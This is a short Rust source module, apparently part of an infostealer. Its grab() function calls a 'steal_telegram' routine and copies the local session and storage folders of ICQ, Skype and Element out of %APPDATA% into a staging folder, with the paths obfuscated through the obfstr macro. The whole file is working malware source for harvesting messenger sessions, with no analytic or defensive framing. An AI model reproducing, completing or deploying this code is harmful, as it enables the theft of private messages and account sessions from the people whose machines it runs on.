use std::collections::HashMap;

pub mod telegram;


pub fn grab(path: String) {
    telegram::steal_telegram(path.clone());
    let mut msgers = HashMap::new();

    msgers.insert(obfstr::obfstr!("ICQ").to_string(), obfstr::obfstr!("%APPDATA%\\ICQ\\0001\\").to_string());
    msgers.insert(obfstr::obfstr!("Skype").to_string(), obfstr::obfstr!("%APPDATA%\\Microsoft\\Skype for Desktop\\Local Storage\\").to_string());
    msgers.insert(obfstr::obfstr!("Element").to_string(), obfstr::obfstr!("%APPDATA%\\Element\\Local Storage\\leveldb\\").to_string());


    for msg in msgers {
        // walkdir depth 1

        let name = msg.0;
        let path = msg.1.replace(obfstr::obfstr!("%APPDATA%"), std::env::var("APPDATA").unwrap().as_str());


        let pathbuf = std::path::PathBuf::from(&format!("{path}\\{name}"));
        let _ = std::fs::create_dir(pathbuf.clone());

        for din in walkdir::WalkDir::new(path).max_depth(1).into_iter().filter(|f| f.is_ok()).map(|f| f.unwrap()) {
            let _ =  std::fs::copy(din.path(), pathbuf.join(din.file_name().to_string_lossy().to_string()));
        }
    }

    
}
